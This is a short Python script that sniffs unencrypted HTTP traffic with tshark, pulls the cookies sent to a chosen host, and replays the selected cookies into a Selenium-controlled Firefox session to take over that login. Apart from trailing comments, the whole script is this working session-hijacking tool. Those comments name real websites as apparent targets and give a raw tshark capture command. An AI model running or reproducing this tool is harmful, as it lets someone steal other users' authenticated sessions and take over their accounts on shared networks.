
from sys import argv
import subprocess
from selenium import webdriver


print('Enter host name (without http prefix): ')
input_host = input()
interface = "enp4s0" # "enp4s0" or "lo"
separator = "|"
# -l is smth like buffer option, useful for parsing in scripts like this
cmd = ['tshark', '-i', interface, '-l', '-Y', 'http.request', '-T', 'fields', '-e', 'http.cookie', '-e', 'http.host', '-e', 'http.user_agent',  '-E', f'separator={separator}']
process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)

host = ''
new_cookies = []

while True:
    output = process.stdout.readline().decode('utf-8').split('\n')[0]
    # if process doesn't response
    if output == '' and process.poll() is not None:
        break
    if output:
        cookie_str, host, user_agent = output.split(separator)
        #print(host)
        if(host == input_host):
            print("Host: ", host)
            splited = cookie_str.split(';')
            iter = 0
            if len(splited) > 0:
                for elem in splited:
                    new_cookie = {}
                    iter+=1
                    tmp =  elem.split('=')
                    if len(tmp) > 1:
                        new_cookie['name'] = tmp[0]
                        new_cookie['value'] = tmp[1]
                        new_cookies.append(new_cookie)
                break
process.kill()
print("Cookies: ")
selected_cookies = []
for cookie in new_cookies:
    print(f"Cookie {new_cookies.index(cookie)+1}: ", cookie)
    print('Add cookie? (y/n)')
    tmp = input()
    if tmp == "y":
        selected_cookies.append(cookie)

new_cookies = []

browser = webdriver.Firefox()
browser.get('http://' + host)
for cookie in selected_cookies:
    browser.delete_cookie(cookie['name'])
    browser.add_cookie(cookie)
browser.refresh()

# http://auschwitz.org/ 
# http://matma4u.pl/example
# tshark -l -Y http.request -T fields -e http.cookie -e http.host -e http.user_agent  -E separator = | > output.txt


